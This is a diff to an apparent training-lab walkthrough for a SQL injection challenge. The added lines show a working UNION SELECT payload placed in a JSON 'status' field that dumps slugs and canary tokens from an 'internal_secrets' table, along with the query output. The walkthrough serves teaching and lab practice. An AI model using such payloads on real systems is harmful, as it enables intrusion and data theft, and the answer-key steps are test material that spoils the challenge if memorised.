@@ -139,9 +139,23 @@ users,products,carts,cart_items,orders,order_items,addresses,flags,hints,reveale
 CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
 ```
 
+The schema names a `slug` column but says nothing about its values. Read those the same way rather than guessing them:
+
+```json
+{
+  "status": "PENDING' UNION SELECT 1, 2, group_concat(slug), 4, 5, 6, 7, 8, 9 FROM internal_secrets --"
+}
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
+
 ### Step 7: Read the canary
 
-One row per injection challenge, keyed by slug. Take the one for this challenge:
+This endpoint only looks for its own token, so ask for the `sql-injection` row:
 
 ```json
 {
@@ -167,6 +181,8 @@ One row per injection challenge, keyed by slug. Take the one for this challenge:
 ![Response containing the flag](../../assets/images/sql-injection/flag.webp)
 
 The token is generated when the lab is seeded, so it is different on every instance: returning it proves the query ran.
+
+Dropping the `WHERE` works just as well: all four rows come back and the endpoint finds its own token among them. The filter keeps the response readable, it is not a requirement.
 
 ## Vulnerable code analysis
 
